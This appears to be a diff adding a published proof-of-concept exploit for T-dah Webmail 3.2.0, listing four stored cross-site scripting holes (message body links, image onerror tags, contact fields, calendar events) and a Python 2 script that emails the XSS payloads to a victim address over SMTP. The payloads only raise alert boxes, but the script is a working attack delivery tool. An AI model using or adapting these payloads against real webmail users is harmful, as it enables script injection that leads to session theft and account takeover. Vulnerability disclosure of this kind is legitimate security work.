@@ -1,0 +1,85 @@
+#!/usr/bin/python
+
+'''
+
+# Exploit Title: T-dah Webmail Multiple Stored XSS issues.
+# Date: 17/08/2012
+# Exploit Author: Shai rod (@NightRang3r)
+# Vendor Homepage: http://tdah.us/
+# Software Link: http://sourceforge.net/projects/t-dahmail/files/latest/download?utm_expid=6384-3&utm_referrer=http%3A%2F%2Fsourceforge.net%2Fprojects%2Ft-dahmail%2F
+# Version: 3.2.0
+ 
+#Gr33Tz: @aviadgolan , @benhayak, @nirgoldshlager, @roni_bachar
+
+About the Application:
+======================
+
+T-dah is an Open Sourced Universal Webmail origially developed by Aldoir Ventura under the name Uebimiau in which we picked up late in 2007.
+It is free and can be installed on any server that supports PHP.
+
+
+Vulnerability Description
+=========================
+
+1. XSS In message body (HREF)
+
+Send an email to the victim with the payload in the e-mail body.
+XSS Will be triggered when the user clicks the link.
+
+XSS Payload: <a href=javascript:alert("XSS")>Click Me</a>
+
+2. Stored XSS in email body (Previously Discovered by loneferret - http://www.exploit-db.com/exploits/20364/).
+
+XSS Payload: <img src='1.jpg'onerror=javascript:alert("XSS")>
+
+Send an email to the victim with the payload in the email body, once the user opens the message XSS should be triggered.
+
+
+3. Stored XSS contacts.
+
+Another stored XSS can be triggered when crating a new contact, almost every field in the form is vulnerable
+for example you can inject your payload <img src='1.jpg'onerror=javascript:alert("XSS")> in the "Name" field, Save contact, XSS Shoud be triggerd.
+
+4. Stored XSS in Calendar
+
+Add a new event to calendar and in the message field insert the javascript payload: <img src='1.jpg'onerror=javascript:alert("XSS")>
+Save the event, XSS Should be truggered.
+
+
+'''
+
+import smtplib
+
+print "###############################################"
+print "#      T-dah Webmail 3.2.0 Stored XSS POC     #"
+print "#            Coded by: Shai rod               #"
+print "#               @NightRang3r                  #"
+print "#           http://exploit.co.il              #"
+print "#       For Educational Purposes Only!        #"
+print "###############################################\r\n"
+
+# SETTINGS
+
+sender = "attacker@localhost"
+smtp_login = sender
+smtp_password = "qwe123"
+recipient = "victim@localhost"
+smtp_server  = "192.168.1.10"
+smtp_port = 25
+subject = "T-dah Webmail XSS POC"
+
+# SEND E-MAIL
+
+print "[*] Sending E-mail to " + recipient + "..."
+msg = ("From: %s\r\nTo: %s\r\nSubject: %s\n"
+       % (sender, ", ".join(recipient), subject) )
+msg += "Content-type: text/html\n\n"
+msg += """<img src='1.jpg'onerror=javascript:alert("XSS-1")>\r\n"""
+msg += """<a href=javascript:alert("XSS-2")>Click Me, Please...</a>\r\n"""
+server = smtplib.SMTP(smtp_server, smtp_port)
+server.ehlo()
+server.starttls()
+server.login(smtp_login, smtp_password)
+server.sendmail(sender, recipient, msg)
+server.quit()
+print "[+] E-mail sent!"
